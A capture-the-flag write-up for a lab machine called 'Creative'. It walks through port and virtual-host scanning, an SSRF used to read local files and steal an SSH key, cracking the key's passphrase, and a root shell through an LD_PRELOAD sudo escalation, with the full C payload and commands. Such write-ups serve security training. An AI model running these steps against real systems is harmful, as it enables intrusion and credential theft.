# Creative

Nmap :

```markdown
└─# nmap creative.thm -sC -sV -p- 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 22:16 +0530
Nmap scan report for 10.48.167.125
Host is up (0.062s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:12:e1:be:76:7e:61:08:12:14:a8:c1:48:46:10:e7 (RSA)
|   256 e7:68:d1:78:2e:34:c9:97:42:2e:5c:67:e1:1a:ce:a8 (ECDSA)
|_  256 f1:65:56:78:5e:b9:5d:55:ee:40:f5:fa:e1:e1:c1:81 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.68 seconds
```

Website ( creative.thm ) :

![Creative.thm](Creative/image.png)

Vhost Enumeration :

```markdown
ffuf -u http://creative.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -H "Host:FUZZ.creative.thm" -t 50 -fw 6
```

```markdown
└─# ffuf -u http://creative.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -H "Host:FUZZ.creative.thm" -t 50 -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 72ms]
Beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 85ms]
BETA                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 87ms]
:: Progress: [62281/62281] :: Job [1/1] :: 922 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
```

we find `beta.creative.thm`

beta.creative.thm :

![beta.creative.thm](Creative/image%201.png)

SSRF :

we try the url `http://127.0.1`

![http://127.0.1](Creative/image%202.png)

we can see the website

we try to enumerate the port on localhost

```markdown
ffuf -u http://beta.creative.thm -w <(seq 0 65535) -X POST -d "url=http://127.0.0.1:FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 13
```

```markdown
┌──(root㉿AkhilBangaru)-[/home/akhilbangaru/THM/Creative]
└─# ffuf -u http://beta.creative.thm -w <(seq 0 65535) -X POST -d "url=http://127.0.0.1:FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 13

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13
________________________________________________

0                       [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 134ms]
80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 314ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 489ms]
:: Progress: [65536/65536] :: Job [1/1] :: 490 req/sec :: Duration: [0:03:41] :: Errors: 120 ::
```

we find the port `1337` :

![http://127.0.1:1337](Creative/image%203.png)

we find it shows the root ( / ) directory of the system 

we get the `id_rsa` file of the user `saad` 

![id_rsa](Creative/image%204.png)

we ssh into the user `saad` but we see we need a passphrase for ssh 

we use `john` to crack the passphrase  

```markdown
ssh2john id_rsa > hash.txt
```

```markdown
john hash.txt -w /usr/share/wordlists/rockyou.txt
```

```markdown
redacted        (id_rsa)     
1g 0:00:00:09 DONE (2026-08-25 23:58) 0.1038g/s 265.8p/s 265.8c/s 265.8C/s chacha..ford
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

we get the user flag ( we can get via the ssrf before or via ssh now:

![user flag](Creative/image%205.png)

we find the password of the saad in .bash_history file :

```markdown
saad@ip-10-49-176-228:~$ cat .bash_history 
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:Redacted" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al
```

```markdown
sudo -l
```

```markdown
saad@ip-10-49-176-228:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-49-176-228:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-49-176-228:
    (root) /usr/bin/ping
```

we get can root from doing LD_PRELOAD Esc :

we create a file `root.c` which contains :

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

then we compile `root.so` file from the file `root.c` :

```markdown
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

we run this cmd to get root :

```markdown
sudo LD_PRELOAD=/home/saad/root.so /usr/bin/ping
```

we get the root flag :

![root flag](Creative/image%206.png)
